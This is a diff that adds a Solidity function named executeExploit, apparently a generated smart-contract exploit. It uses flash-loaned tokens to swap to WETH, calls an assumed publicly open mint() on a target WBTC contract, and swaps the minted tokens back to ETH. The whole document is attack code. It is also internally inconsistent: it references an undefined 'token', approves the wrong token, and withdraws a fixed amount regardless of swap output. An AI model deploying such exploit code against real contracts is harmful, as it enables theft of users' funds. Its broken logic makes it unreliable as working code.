@@ -1,0 +1,43 @@
+```solidity
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // Start the exploit sequence: flash loan received, perform transactions, and repay flash loan
+    valuableToken.approve(address(uniswapRouter), amount);
+
+    // Swap valuableToken for WETH (or WBTC if it's the case)
+    address[] memory path = new address[](2);
+    path[0] = address(valuableToken); // valuableToken
+    path[1] = uniswapRouter.WETH(); // WETH
+
+    uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
+        amount, 
+        0, // amountOutMin
+        path,
+        address(this), 
+        block.timestamp
+    );
+
+    // After acquiring WETH, let's use them for minting WBTC from the target contract
+    IWETH(uniswapRouter.WETH()).withdraw(amount); // Withdraw WETH to send them to the WBTC contract
+
+    // Assuming the WBTC contract has a mint function allowing anyone to mint WBTC before the minting finishes
+    // mint amount of WBTC here
+    WBTC(target).mint(address(this), amount); // Minting WBTC using the WETH we swapped for.
+
+    // Swap the newly acquired WBTC back to WETH
+    address[] memory pathReverse = new address[](2);
+    pathReverse[0] = address(token);
+    pathReverse[1] = uniswapRouter.WETH();
+
+    valuableToken.approve(address(uniswapRouter), amount); // Approve WBTC for the uniswap
+
+    uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
+        amount, 
+        0, // amountOutMin
+        pathReverse,
+        address(this), 
+        block.timestamp
+    );
+}
+</executeExploitCode>
+```
